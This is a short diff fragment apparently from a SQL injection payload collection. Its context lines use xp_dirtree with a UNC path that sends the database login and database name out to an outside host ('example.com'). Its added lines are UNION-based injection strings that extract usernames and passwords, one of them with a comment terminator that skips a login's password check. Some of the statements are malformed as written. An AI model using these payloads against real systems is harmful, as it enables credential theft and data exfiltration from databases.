@@ -15,3 +15,7 @@ DECLARE @b varchar(1024);
 SELECT @a = (SELECT system_user);
 SELECT @b = (SELECT DB_Name()); 
 EXEC('master..xp_dirtree"\\'+@a+''+'.'+''+@b+'example.com\test$"');
+SELECT username, password FROM users
+UNION 
+SELECT username || '~' || password FROM users;
+SELECT * FROM users WHERE username = '' UNION SELECT username, password FROM users--' AND password = '123'
